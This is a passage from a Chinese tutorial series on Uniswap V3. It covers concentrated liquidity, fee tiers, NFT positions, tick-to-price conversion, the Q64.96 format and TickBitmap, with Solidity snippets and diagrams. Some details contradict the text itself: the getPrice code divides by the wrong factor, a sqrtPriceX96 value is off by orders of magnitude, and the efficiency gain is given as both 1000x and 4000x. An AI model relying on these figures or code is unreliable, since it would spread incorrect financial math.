M3[&quot;所有资本集中在&lt;br/&gt;有效价格区间&quot;]\n    end\n\n    XV --&gt; M1\n    YV --&gt; M1\n    M1 --&gt; M2\n    M2 --&gt; M3\n\n2.4 三种价格位置的资产状态\n根据当前价格相对于LP设定区间的位置，资产状态会有所不同：\nstateDiagram-v2\n    [*] --&gt; BelowRange: P &lt; Pa\n    [*] --&gt; InRange: Pa ≤ P ≤ Pb\n    [*] --&gt; AboveRange: P &gt; Pb\n\n    BelowRange --&gt; OnlyToken0: 100% token0\n    InRange --&gt; MixedHolding: token0 + token1\n    AboveRange --&gt; OnlyToken1: 100% token1\n\n    state BelowRange as &quot;价格在区间下方&quot;\n    state InRange as &quot;价格在区间内&quot;\n    state AboveRange as &quot;价格在区间上方&quot;\n    state OnlyToken0 as &quot;只持有Token0&quot;\n    state MixedHolding as &quot;混合持有&quot;\n    state OnlyToken1 as &quot;只持有Token1&quot;\n\n    note right of InRange\n        流动性活跃\n        可赚取交易费用\n    end note\n\n    note right of BelowRange\n        流动性未激活\n        等待价格上涨\n    end note\n\n    note right of AboveRange\n        流动性未激活\n        等待价格下跌\n    end note\n\n代码实现：\nfunction getVirtualReserves(\n    uint160 sqrtPriceX96,\n    uint128 liquidity,\n    uint160 sqrtPriceAX96,  // 下界\n    uint160 sqrtPriceBX96   // 上界\n) internal pure returns (uint256 amount0, uint256 amount1) {\n    if (sqrtPriceX96 &lt;= sqrtPriceAX96) {\n        // 价格在区间下方：只有token0\n        amount0 = SqrtPriceMath.getAmount0Delta(\n            sqrtPriceAX96, sqrtPriceBX96, liquidity, false\n        );\n        amount1 = 0;\n    } else if (sqrtPriceX96 &lt; sqrtPriceBX96) {\n        // 价格在区间内：两种token都有\n        amount0 = SqrtPriceMath.getAmount0Delta(\n            sqrtPriceX96, sqrtPriceBX96, liquidity, false\n        );\n        amount1 = SqrtPriceMath.getAmount1Delta(\n            sqrtPriceAX96, sqrtPriceX96, liquidity, false\n        );\n    } else {\n        // 价格在区间上方：只有token1\n        amount0 = 0;\n        amount1 = SqrtPriceMath.getAmount1Delta(\n            sqrtPriceAX96, sqrtPriceBX96, liquidity, false\n        );\n    }\n}\n\n3. 资本效率的革命性提升\n3.1 效率提升的量化分析\ngraph TB\n    subgraph TraditionalAMMCompare[&quot;传统AMM&quot;]\n        TA[&quot;总流动性: $1,000,000&quot;]\n        TB[&quot;有效价格区间: [0.9P, 1.1P]&quot;]\n        TC[&quot;实际利用率: ~0.1%&quot;]\n        TD[&quot;有效流动性: ~$1,000&quot;]\n    end\n\n    subgraph UniswapV3Compare[&quot;Uniswap V3&quot;]\n        VA[&quot;总流动性: $1,000&quot;]\n        VB[&quot;集中区间: [0.9P, 1.1P]&quot;]\n        VC[&quot;实际利用率: 100%&quot;]\n        VD[&quot;有效流动性: $1,000&quot;]\n    end\n\n    TA --&gt; TC\n    TC --&gt; TD\n    VA --&gt; VC\n    VC --&gt; VD\n\n    TD -.-&gt;|&quot;效果相同&quot;| VD\n\n    style VA fill:#c8e6c9\n    style VD fill:#c8e6c9\n\n效率提升计算：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n指标传统AMMUniswap V3提升倍数所需资金$1,000,000$1,0001000x价格区间[0, ∞][0.9P, 1.1P]精确控制有效流动性~$1,000$1,000相同效果费用收益率0.1%100%1000x\n3.2 不同场景的最优区间选择\nflowchart TD\n    subgraph StablePairs[&quot;稳定币对&quot;]\n        S1[&quot;USDC/USDT&quot;]\n        S2[&quot;区间: [0.999, 1.001]&quot;]\n        S3[&quot;极窄区间&lt;br/&gt;最大化费用收益&quot;]\n    end\n\n    subgraph MainstreamPairs[&quot;主流币对&quot;]\n        M1[&quot;ETH/USDC&quot;]\n        M2[&quot;区间: [1500, 2500]&quot;]\n        M3[&quot;中等区间&lt;br/&gt;平衡收益与风险&quot;]\n    end\n\n    subgraph VolatilePairs[&quot;高波动币对&quot;]\n        H1[&quot;新币/ETH&quot;]\n        H2[&quot;区间: [0.5P, 2P]&quot;]\n        H3[&quot;宽区间&lt;br/&gt;降低失效风险&quot;]\n    end\n\n    S1 --&gt; S2 --&gt; S3\n    M1 --&gt; M2 --&gt; M3\n    H1 --&gt; H2 --&gt; H3\n\n\n4. 多级费用结构\n4.1 费用等级设计\nV3引入了多级费用结构，适应不同风险级别的交易对：\ngraph LR\n    subgraph FeeTiers[&quot;费用等级&quot;]\n        F1[&quot;0.01%&lt;br/&gt;稳定币对&quot;]\n        F2[&quot;0.05%&lt;br/&gt;相关资产&quot;]\n        F3[&quot;0.30%&lt;br/&gt;主流币对&quot;]\n        F4[&quot;1.00%&lt;br/&gt;高风险币对&quot;]\n    end\n\n    F1 --&gt;|Tick间距: 1| T1[&quot;最细粒度&lt;br/&gt;适合价格稳定&quot;]\n    F2 --&gt;|Tick间距: 10| T2[&quot;细粒度&lt;br/&gt;相关性强&quot;]\n    F3 --&gt;|Tick间距: 60| T3[&quot;中等粒度&lt;br/&gt;平衡效率&quot;]\n    F4 --&gt;|Tick间距: 200| T4[&quot;粗粒度&lt;br/&gt;高波动性&quot;]\n\n4.2 费用与Tick间距的绑定\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率费率值(bps)Tick间距最小价格变化适用场景0.01%10010.01%稳定币对0.05%500100.10%相关资产0.30%3000600.60%主流币对1.00%100002002.00%高风险币对\n设计原理：\n\n低费率池需要更细的价格粒度以精确定价\n高费率池使用粗粒度降低gas成本\nTick间距直接影响LP能设置的价格范围精度\n\n\n5. NFT化的流动性代币\n5.1 从同质化到非同质化\nflowchart TB\n    subgraph V2[&quot;Uniswap V2&quot;]\n        V2LP[&quot;ERC20 LP Token&quot;]\n        V2F[&quot;可替代性&lt;br/&gt;所有LP权益相同&quot;]\n        V2S[&quot;简单分割&lt;br/&gt;易于组合&quot;]\n    end\n\n    subgraph V3[&quot;Uniswap V3&quot;]\n        V3LP[&quot;ERC721 NFT&quot;]\n        V3F[&quot;不可替代&lt;br/&gt;每个位置独特&quot;]\n        V3S[&quot;独立管理&lt;br/&gt;需要单独跟踪&quot;]\n    end\n\n    V2 --&gt;|演进| V3\n\n    V2LP --&gt; V2F --&gt; V2S\n    V3LP --&gt; V3F --&gt; V3S\n\n    style V3 fill:#e3f2fd\n\n5.2 NFT包含的信息\n每个V3流动性NFT包含以下独特信息：\nstruct Position {\n    // 流动性数量\n    uint128 liquidity;\n \n    // 价格区间边界（Tick值）\n    int24 tickLower;\n    int24 tickUpper;\n \n    // 费用增长追踪\n    uint256 feeGrowthInside0LastX128;\n    uint256 feeGrowthInside1LastX128;\n \n    // 待领取的费用\n    uint128 tokensOwed0;\n    uint128 tokensOwed1;\n}\ngraph TB\n    NFT[&quot;NFT LP Token&lt;br/&gt;(ERC721)&quot;]\n\n    NFT --&gt; L[&quot;流动性数量&lt;br/&gt;liquidity&quot;]\n    NFT --&gt; R[&quot;价格区间&lt;br/&gt;[tickLower, tickUpper]&quot;]\n    NFT --&gt; F[&quot;费用追踪&lt;br/&gt;feeGrowthInside&quot;]\n    NFT --&gt; O[&quot;待领取费用&lt;br/&gt;tokensOwed&quot;]\n\n    L --&gt; LP[&quot;决定在区间内&lt;br/&gt;的深度贡献&quot;]\n    R --&gt; RP[&quot;决定何时&lt;br/&gt;流动性活跃&quot;]\n    F --&gt; FP[&quot;记录上次领取&lt;br/&gt;费用的时间点&quot;]\n    O --&gt; OP[&quot;累积的&lt;br/&gt;可领取费用&quot;]\n\n\n6. 本章小结\n6.1 V3的核心创新总结\nmindmap\n  root((Uniswap V3&lt;br/&gt;核心创新))\n    集中流动性\n      自定义价格区间\n      资本效率提升4000倍\n      虚拟储备机制\n    多级费用\n      0.01% - 1.00%\n      适应不同风险\n      与Tick间距绑定\n    NFT LP Token\n      非同质化\n      独立管理\n      精确费用追踪\n    高级预言机\n      TWAP机制\n      抗操纵性\n      历史数据支持\n\n6.2 关键概念回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念定义重要性集中流动性LP在自定义价格区间提供流动性V3的核心创新虚拟储备使区间内行为等同传统AMM的数学构造理解公式的关键资本效率单位资金的有效利用率最高提升4000倍Tick间距最小价格变动单位与费率等级绑定NFT LP代表独特流动性位置的非同质化代币精确管理每个位置\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Tick机制与价格数学，包括：\n\nTick的数学定义与设计原理\n价格与Tick的双向转换算法\nQ64.96定点数格式详解\nTickMath库的核心实现\n\n\n参考资料\n\nUniswap V3 白皮书\nUniswap V3 Core 源码\nUniswap V3 开发文档\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/02-Tick机制与价格数学":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/02-Tick机制与价格数学","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/02-Tick机制与价格数学.md","title":"02-Tick机制与价格数学","links":[],"tags":[],"content":"死磕Uniswap V3（二）：Tick机制与价格数学\n\n本文是「死磕Uniswap V3」系列的第二篇，深入探讨Tick机制的设计原理和价格数学的核心算法。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. Tick机制概述\n1.1 为什么需要Tick？\n在传统AMM中，价格是连续的实数。但在区块链上，我们需要：\n\n高效存储：连续价格需要无限存储\n快速计算：整数运算远快于浮点运算\n精确定位：方便LP设定价格区间边界\n\nflowchart LR\n    subgraph Problems[&quot;问题&quot;]\n        P1[&quot;连续价格空间&lt;br/&gt;[0, ∞]&quot;]\n        P2[&quot;无限精度需求&quot;]\n        P3[&quot;存储成本高&quot;]\n        P4[&quot;计算效率低&quot;]\n    end\n\n    subgraph Solutions[&quot;解决方案&quot;]\n        S1[&quot;离散化价格空间&quot;]\n        S2[&quot;Tick索引系统&quot;]\n        S3[&quot;紧凑存储&quot;]\n        S4[&quot;整数运算&quot;]\n    end\n\n    P1 --&gt; S1\n    P2 --&gt; S2\n    P3 --&gt; S3\n    P4 --&gt; S4\n\n    style Solutions fill:#c8e6c9\n\n1.2 Tick的数学定义\n核心公式：\nprice = 1.0001^tick\n\n这意味着：\n\n每个Tick代表**0.01%**的价格变化\n相邻Tick的价格比为 1.0001（即100.01%）\n\ngraph TB\n    subgraph TickRange[&quot;Tick范围&quot;]\n        MIN[&quot;MIN_TICK = -887272&quot;]\n        ZERO[&quot;TICK = 0&lt;br/&gt;price = 1&quot;]\n        MAX[&quot;MAX_TICK = 887272&quot;]\n    end\n\n    MIN --&gt;|&quot;价格递增&quot;| ZERO\n    ZERO --&gt;|&quot;价格递增&quot;| MAX\n\n    subgraph PriceMapping[&quot;价格对应&quot;]\n        PMIN[&quot;最小价格 ≈ 2.94e-39&quot;]\n        P1[&quot;price = 1.0001^0 = 1&quot;]\n        PMAX[&quot;最大价格 ≈ 3.40e+38&quot;]\n    end\n\n    MIN -.-&gt; PMIN\n    ZERO -.-&gt; P1\n    MAX -.-&gt; PMAX\n\n1.3 为什么选择1.0001作为基数？\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n考量因素1.0001的优势精度需求0.01%变化足够精细，满足大多数交易场景范围覆盖±887272个Tick可覆盖天文数字级别的价格范围计算效率可通过二进制分解高效计算幂运算存储优化int24类型（3字节）即可存储所有Tick值\n\n2. 价格的平方根表示\n2.1 为什么使用√price？\nV3不直接存储价格，而是存储价格的平方根（sqrtPrice）：\nflowchart TD\n    subgraph DirectPriceProblems[&quot;直接存储价格的问题&quot;]\n        A1[&quot;价格可能极大或极小&quot;]\n        A2[&quot;乘法容易溢出&quot;]\n        A3[&quot;AMM公式大量涉及√P&quot;]\n    end\n\n    subgraph SqrtPriceAdvantages[&quot;存储√price的优势&quot;]\n        B1[&quot;数值范围更稳定&quot;]\n        B2[&quot;减少溢出风险&quot;]\n        B3[&quot;简化公式计算&quot;]\n        B4[&quot;更高精度&quot;]\n    end\n\n    A1 --&gt; B1\n    A2 --&gt; B2\n    A3 --&gt; B3\n\n    style SqrtPriceAdvantages fill:#e8f5e9\n\nAMM公式中的应用：\n在集中流动性公式中，代币数量的计算大量涉及√P：\nΔx = L × (1/√Pa - 1/√Pb)  // token0变化量\nΔy = L × (√Pb - √Pa)      // token1变化量\n\n2.2 Q64.96定点数格式\nV3使用Q64.96定点数格式存储√price：\ngraph LR\n    subgraph SqrtPriceX96Format[&quot;uint160 sqrtPriceX96&quot;]\n        I[&quot;整数部分&lt;br/&gt;64位&quot;]\n        D[&quot;小数部分&lt;br/&gt;96位&quot;]\n    end\n\n    I --&gt; R1[&quot;范围: 0 ~ 2^64&quot;]\n    D --&gt; R2[&quot;精度: 2^-96&quot;]\n\n    subgraph ActualValueCalc[&quot;实际值计算&quot;]\n        F[&quot;实际√price = sqrtPriceX96 / 2^96&quot;]\n    end\n\n    I --&gt; F\n    D --&gt; F\n\n格式详解：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n属性值总位数160位（正好适配uint160）整数部分64位，范围 [0, 2^64)小数部分96位，精度 2^(-96) ≈ 1.26×10^(-29)表示范围覆盖所有可能的价格\n示例代码：\n// √1 在Q64.96格式下的值\nuint160 sqrtPriceX96 = 79228162514264337593543950336; // 2^96\n \n// 从sqrtPriceX96计算实际价格\nfunction getPrice(uint160 sqrtPriceX96) public pure returns (uint256) {\n    // price = (sqrtPriceX96 / 2^96)^2 = sqrtPriceX96^2 / 2^192\n    return FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);\n}\n\n3. Tick与价格的双向转换\n3.1 转换关系总览\nflowchart LR\n    T[&quot;Tick&lt;br/&gt;(int24)&quot;]\n    SP[&quot;sqrtPriceX96&lt;br/&gt;(uint160)&quot;]\n    P[&quot;实际价格&lt;br/&gt;(uint256)&quot;]\n\n    T --&gt;|&quot;getSqrtRatioAtTick()&quot;| SP\n    SP --&gt;|&quot;getTickAtSqrtRatio()&quot;| T\n    SP --&gt;|&quot;平方运算&quot;| P\n    P --&gt;|&quot;开方运算&quot;| SP\n\n    style T fill:#e3f2fd\n    style SP fill:#fff3e0\n    style P fill:#fce4ec\n\n3.2 正向转换：Tick → √Price\n核心算法：使用二进制分解实现高效幂运算\nflowchart TD\n    subgraph Input[&quot;输入&quot;]\n        T[&quot;tick = 13&quot;]\n    end\n\n    subgraph BinaryDecomposition[&quot;二进制分解&quot;]\n        B[&quot;13 = 1101₂ = 8 + 4 + 1&quot;]\n    end\n\n    subgraph PowerDecomposition[&quot;幂运算分解&quot;]\n        P1[&quot;1.0001^13&quot;]\n        P2[&quot;= 1.0001^8 × 1.0001^4 × 1.0001^1&quot;]\n    end\n\n    subgraph PrecomputedLookup[&quot;预计算表查找&quot;]\n        L1[&quot;查表: √(1.0001^1)&quot;]\n        L2[&quot;查表: √(1.0001^4)&quot;]\n        L3[&quot;查表: √(1.0001^8)&quot;]\n    end\n\n    subgraph Result[&quot;结果&quot;]\n        R[&quot;ratio = L1 × L2 × L3&quot;]\n    end\n\n    T --&gt; B --&gt; P1 --&gt; P2\n    P2 --&gt; L1\n    P2 --&gt; L2\n    P2 --&gt; L3\n    L1 --&gt; R\n    L2 --&gt; R\n    L3 --&gt; R\n\n预计算常数表（部分）：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n二进制位对应幂次预计算值（×2^128）0x1√(1.0001^1)0xfffcb933bd6fad37aa2d162d1a5940010x2√(1.0001^2)0xfff97272373d413259a46990580e213a0x4√(1.0001^4)0xfff2e50f5f656932ef12357cf3c7fdcc0x8√(1.0001^8)0xffe5caca7e10e4e61c3624eaa0941cd0………\n核心代码实现：\nfunction getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {\n    uint256 absTick = tick &lt; 0 ? uint256(-int256(tick)) : uint256(int256(tick));\n    require(absTick &lt;= uint256(MAX_TICK), &#039;T&#039;);\n \n    // 二进制分解 + 预计算表查找\n    uint256 ratio = absTick &amp; 0x1 != 0\n        ? 0xfffcb933bd6fad37aa2d162d1a594001\n        : 0x100000000000000000000000000000000;\n \n    // 检查每一位并累乘对应的预计算值\n    if (absTick &amp; 0x2 != 0)\n        ratio = (ratio * 0xfff97272373d413259a46990580e213a) &gt;&gt; 128;\n    if (absTick &amp; 0x4 != 0)\n        ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) &gt;&gt; 128;\n    if (absTick &amp; 0x8 != 0)\n        ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) &gt;&gt; 128;\n    // ... 继续检查到第20位\n \n    // 处理负tick：取倒数\n    if (tick &gt; 0) ratio = type(uint256).max / ratio;\n \n    // 从Q128转为Q96格式，向上舍入\n    sqrtPriceX96 = uint160((ratio &gt;&gt; 32) + (ratio % (1 &lt;&lt; 32) == 0 ? 0 : 1));\n}\n算法复杂度：O(log(tick))，最多20次乘法运算\n3.3 反向转换：√Price → Tick\n反向转换使用对数运算：\nflowchart TD\n    subgraph InputSP[&quot;输入&quot;]\n        SP[&quot;sqrtPriceX96&quot;]\n    end\n\n    subgraph Step1MSB[&quot;Step 1: MSB查找&quot;]\n        MSB[&quot;找到最高有效位&lt;br/&gt;确定数值范围&quot;]\n    end\n\n    subgraph Step2Log[&quot;Step 2: 计算log₂&quot;]\n        LOG[&quot;使用汇编优化&lt;br/&gt;计算log₂(ratio)&quot;]\n    end\n\n    subgraph Step3Convert[&quot;Step 3: 转换基数&quot;]\n        CONV[&quot;log₂ → log_{√1.0001}&lt;br/&gt;乘以转换因子&quot;]\n    end\n\n    subgraph Step4Boundary[&quot;Step 4: 边界处理&quot;]\n        BOUND[&quot;处理舍入误差&lt;br/&gt;验证tick准确性&quot;]\n    end\n\n    subgraph OutputTick[&quot;输出&quot;]\n        T[&quot;tick (int24)&quot;]\n    end\n\n    SP --&gt; MSB --&gt; LOG --&gt; CONV --&gt; BOUND --&gt; T\n\n核心数学原理：\nprice = 1.0001^tick\nlog(price) = tick × log(1.0001)\ntick = log(price) / log(1.0001)\ntick = log₂(price) / log₂(1.0001)\ntick = log₂(sqrtPrice²) / log₂(√1.0001)\ntick = 2 × log₂(sqrtPrice) / log₂(1.0001)\n\n边界处理的必要性：\n由于浮点计算存在精度误差，需要额外验证：\n// 计算可能的tick范围\nint24 tickLow = int24((log_sqrt10001 - 3402992956809132418596140100660247210) &gt;&gt; 128);\nint24 tickHi = int24((log_sqrt10001 + 291339464771989622907027621153398088495) &gt;&gt; 128);\n \n// 验证并选择正确的tick\ntick = tickLow == tickHi\n    ? tickLow\n    : getSqrtRatioAtTick(tickHi) &lt;= sqrtPriceX96 ? tickHi : tickLow;\n\n4. TickBitmap：高效的Tick查找\n4.1 设计目标\n在交换过程中，需要快速找到下一个已初始化的Tick（即有流动性的价格边界）。\nflowchart LR\n    subgraph Problem[&quot;问题&quot;]\n        Q[&quot;如何快速找到&lt;br/&gt;下一个活跃Tick?&quot;]\n    end\n\n    subgraph BruteForce[&quot;暴力搜索&quot;]\n        B1[&quot;遍历所有Tick&quot;]\n        B2[&quot;O(n)复杂度&quot;]\n        B3[&quot;Gas成本高&quot;]\n    end\n\n    subgraph TickBitmapSolution[&quot;TickBitmap方案&quot;]\n        T1[&quot;位图压缩存储&quot;]\n        T2[&quot;O(1)查找&quot;]\n        T3[&quot;Gas优化&quot;]\n    end\n\n    Q --&gt; B1 --&gt; B2 --&gt; B3\n    Q --&gt; T1 --&gt; T2 --&gt; T3\n\n    style TickBitmapSolution fill:#c8e6c9\n\n4.2 位图结构\n每个uint256存储256个Tick的初始化状态：\ngraph TB\n    subgraph BitmapStorage[&quot;TickBitmap存储结构&quot;]\n        M[&quot;mapping(int16 =&gt; uint256)&quot;]\n    end\n\n    subgraph SingleWord[&quot;单个Word (256位)&quot;]\n        W[&quot;bit0 | bit1 | bit2 | ... | bit255&quot;]\n    end\n\n    subgraph PositionCalc[&quot;位置计算&quot;]\n        P1[&quot;wordPos = tick &gt;&gt; 8&quot;]\n        P2[&quot;bitPos = tick % 256&quot;]\n    end\n\n    M --&gt; W\n    W --&gt; P1\n    W --&gt; P2\n\n    subgraph Example[&quot;示例&quot;]\n        E[&quot;tick = 300&lt;br/&gt;wordPos = 1&lt;br/&gt;bitPos = 44&quot;]\n    end\n\n存储效率：\n\n每个Tick仅占用1 bit\n256个相邻Tick共享一个存储槽\n极大节省存储成本\n\n4.3 核心操作\n翻转Tick状态\nfunction flipTick(\n    mapping(int16 =&gt; uint256) storage self,\n    int24 tick,\n    int24 tickSpacing\n) internal {\n    require(tick % tickSpacing == 0); // 确保tick对齐\n    (int16 wordPos, uint8 bitPos) = position(tick / tickSpacing);\n    uint256 mask = 1 &lt;&lt; bitPos;\n    self[wordPos] ^= mask; // XOR操作翻转状态\n}\n查找下一个初始化的Tick\nflowchart TD\n    subgraph InputParams[&quot;输入&quot;]\n        I[&quot;当前tick&lt;br/&gt;交换方向(lte)&quot;]\n    end\n\n    subgraph SearchLeft[&quot;向左查找 (价格下降)&quot;]\n        L1[&quot;获取当前word&quot;]\n        L2[&quot;掩码屏蔽右侧位&quot;]\n        L3[&quot;查找最高有效位MSB&quot;]\n        L4[&quot;计算目标tick&quot;]\n    end\n\n    subgraph SearchRight[&quot;向右查找 (价格上升)&quot;]\n        R1[&quot;获取下一word&quot;]\n        R2[&quot;掩码屏蔽左侧位&quot;]\n        R3[&quot;查找最低有效位LSB&quot;]\n        R4[&quot;计算目标tick&quot;]\n    end\n\n    I --&gt;|&quot;zeroForOne=true&quot;| SearchLeft\n    I --&gt;|&quot;zeroForOne=false&quot;| SearchRight\n\n    SearchLeft --&gt; O[&quot;返回(nextTick, initialized)&quot;]\n    SearchRight --&gt; O\n\n代码实现：\nfunction nextInitializedTickWithinOneWord(\n    mapping(int16 =&gt; uint256) storage self,\n    int24 tick,\n    int24 tickSpacing,\n    bool lte  // less than or equal，表示向左查找\n) internal view returns (int24 next, bool initialized) {\n    int24 compressed = tick / tickSpacing;\n    if (tick &lt; 0 &amp;&amp; tick % tickSpacing != 0) compressed--;\n \n    if (lte) {\n        // 向左查找（价格下降方向）\n        (int16 wordPos, uint8 bitPos) = position(compressed);\n        // 创建掩码，保留当前位及左侧所有位\n        uint256 mask = (1 &lt;&lt; bitPos) - 1 + (1 &lt;&lt; bitPos);\n        uint256 masked = self[wordPos] &amp; mask;\n \n        initialized = masked != 0;\n        next = initialized\n            ? (compressed - int24(bitPos - BitMath.mostSignificantBit(masked))) * tickSpacing\n            : (compressed - int24(bitPos)) * tickSpacing;\n    } else {\n        // 向右查找（价格上升方向）\n        (int16 wordPos, uint8 bitPos) = position(compressed + 1);\n        // 创建掩码，保留当前位及右侧所有位\n        uint256 mask = ~((1 &lt;&lt; bitPos) - 1);\n        uint256 masked = self[wordPos] &amp; mask;\n \n        initialized = masked != 0;\n        next = initialized\n            ? (compressed + 1 + int24(BitMath.leastSignificantBit(masked) - bitPos)) * tickSpacing\n            : (compressed + 1 + int24(type(uint8).max - bitPos)) * tickSpacing;\n    }\n}\n\n5. BitMath库：高级位运算\n5.1 最高有效位(MSB)查找\n使用二分查找思想，时间复杂度O(log n)：\nflowchart TD\n    subgraph InputX[&quot;输入&quot;]\n        X[&quot;x = 0x0000...1234&quot;]\n    end\n\n    subgraph BinarySearch[&quot;二分查找过程&quot;]\n        C1[&quot;x &gt;= 2^128?&quot;]\n        C2[&quot;x &gt;= 2^64?&quot;]\n        C3[&quot;x &gt;= 2^32?&quot;]\n        C4[&quot;x &gt;= 2^16?&quot;]\n        C5[&quot;x &gt;= 2^8?&quot;]\n        C6[&quot;x &gt;= 2^4?&quot;]\n        C7[&quot;x &gt;= 2^2?&quot;]\n        C8[&quot;x &gt;= 2^1?&quot;]\n    end\n\n    X --&gt; C1\n    C1 --&gt;|&quot;是&quot;| A1[&quot;r += 128; x &gt;&gt;= 128&quot;]\n    C1 --&gt;|&quot;否&quot;| C2\n    C2 --&gt;|&quot;是&quot;| A2[&quot;r += 64; x &gt;&gt;= 64&quot;]\n    C2 --&gt;|&quot;否&quot;| C3\n    C3 --&gt; |&quot;...&quot;| C8\n\n    C8 --&gt; R[&quot;返回 r&quot;]\n\n代码实现：\nfunction mostSignificantBit(uint256 x) internal pure returns (uint8 r) {\n    require(x &gt; 0);\n \n    // 二分查找\n    if (x &gt;= 0x100000000000000000000000000000000) { x &gt;&gt;= 128; r += 128; }\n    if (x &gt;= 0x10000000000000000) { x &gt;&gt;= 64; r += 64; }\n    if (x &gt;= 0x100000000) { x &gt;&gt;= 32; r += 32; }\n    if (x &gt;= 0x10000) { x &gt;&gt;= 16; r += 16; }\n    if (x &gt;= 0x100) { x &gt;&gt;= 8; r += 8; }\n    if (x &gt;= 0x10) { x &gt;&gt;= 4; r += 4; }\n    if (x &gt;= 0x4) { x &gt;&gt;= 2; r += 2; }\n    if (x &gt;= 0x2) r += 1;\n}\n5.2 最低有效位(LSB)查找\nfunction leastSignificantBit(uint256 x) internal pure returns (uint8 r) {\n    require(x &gt; 0);\n \n    r = 255;\n    if (x &amp; type(uint128).max &gt; 0) { r -= 128; } else { x &gt;&gt;= 128; }\n    if (x &amp; type(uint64).max &gt; 0) { r -= 64; } else { x &gt;&gt;= 64; }\n    if (x &amp; type(uint32).max &gt; 0) { r -= 32; } else { x &gt;&gt;= 32; }\n    if (x &amp; type(uint16).max &gt; 0) { r -= 16; } else { x &gt;&gt;= 16; }\n    if (x &amp; type(uint8).max &gt; 0) { r -= 8; } else { x &gt;&gt;= 8; }\n    if (x &amp; 0xf &gt; 0) { r -= 4; } else { x &gt;&gt;= 4; }\n    if (x &amp; 0x3 &gt; 0) { r -= 2; } else { x &gt;&gt;= 2; }\n    if (x &amp; 0x1 &gt; 0) r -= 1;\n}\n\n6. Tick间距与费率的绑定\n6.1 设计原理\n不同费率的池子使用不同的Tick间距：\ngraph TB\n    subgraph FeeTiers[&quot;费率等级&quot;]\n        F1[&quot;0.01%&lt;br/&gt;稳定币&quot;]\n        F2[&quot;0.05%&lt;br/&gt;相关资产&quot;]\n        F3[&quot;0.30%&lt;br/&gt;主流币&quot;]\n        F4[&quot;1.00%&lt;br/&gt;高风险&quot;]\n    end\n\n    subgraph TickSpacing[&quot;Tick间距&quot;]\n        T1[&quot;间距: 1&lt;br/&gt;精度: 0.01%&quot;]\n        T2[&quot;间距: 10&lt;br/&gt;精度: 0.10%&quot;]\n        T3[&quot;间距: 60&lt;br/&gt;精度: 0.60%&quot;]\n        T4[&quot;间距: 200&lt;br/&gt;精度: 2.00%&quot;]\n    end\n\n    subgraph Impact[&quot;影响&quot;]\n        I1[&quot;位图更密集&lt;br/&gt;Gas成本高&quot;]\n        I2[&quot;适中&quot;]\n        I3[&quot;适中&quot;]\n        I4[&quot;位图更稀疏&lt;br/&gt;Gas成本低&quot;]\n    end\n\n    F1 --&gt; T1 --&gt; I1\n    F2 --&gt; T2 --&gt; I2\n    F3 --&gt; T3 --&gt; I3\n    F4 --&gt; T4 --&gt; I4\n\n6.2 间距限制的数学原因\nfunction enableFeeAmount(uint24 fee, int24 tickSpacing) public override {\n    require(msg.sender == owner);\n    require(fee &lt; 1000000); // 最大100%费率\n \n    // tick间距限制: (0, 16384)\n    require(tickSpacing &gt; 0 &amp;&amp; tickSpacing &lt; 16384);\n    require(feeAmountTickSpacing[fee] == 0);\n \n    feeAmountTickSpacing[fee] = tickSpacing;\n    emit FeeAmountEnabled(fee, tickSpacing);\n}\n为什么限制在16384以内？\n16384 tick对应的价格变化:\n1.0001^16384 ≈ 5.12\n\n即单个word(256个tick × 60间距)覆盖的价格变化约为:\n1.0001^(256 × 60) ≈ 4.7倍\n\n这确保了在一个word内可以完成大部分正常交易的tick查找。\n\n7. 实际计算示例\n7.1 ETH/USDC价格转换\n假设ETH价格为2000 USDC：\nflowchart LR\n    subgraph Step1[&quot;步骤1&quot;]\n        P[&quot;ETH/USDC = 2000&quot;]\n        SP[&quot;√2000 ≈ 44.72&quot;]\n    end\n\n    subgraph Step2[&quot;步骤2&quot;]\n        Q96[&quot;sqrtPriceX96&lt;br/&gt;= 44.72 × 2^96&lt;br/&gt;≈ 3.54 × 10^30&quot;]\n    end\n\n    subgraph Step3[&quot;步骤3&quot;]\n        T[&quot;tick = log_{1.0001}(2000)&lt;br/&gt;≈ 69082&quot;]\n    end\n\n    P --&gt; SP --&gt; Q96 --&gt; T\n\n7.2 代码验证\n// 价格2000对应的tick\nint24 tick = 69082;\n \n// 验证\nuint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);\n// sqrtPriceX96 ≈ 3543191142285914188532578\n \n// 计算实际价格\nuint256 price = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);\n// price ≈ 2000 (以token1/token0表示)\n\n8. 本章小结\n8.1 核心概念回顾\nmindmap\n  root((Tick机制))\n    价格离散化\n      price = 1.0001^tick\n      0.01%精度\n      int24存储\n    √price存储\n      Q64.96格式\n      uint160类型\n      数值稳定\n    双向转换\n      二进制分解\n      预计算表\n      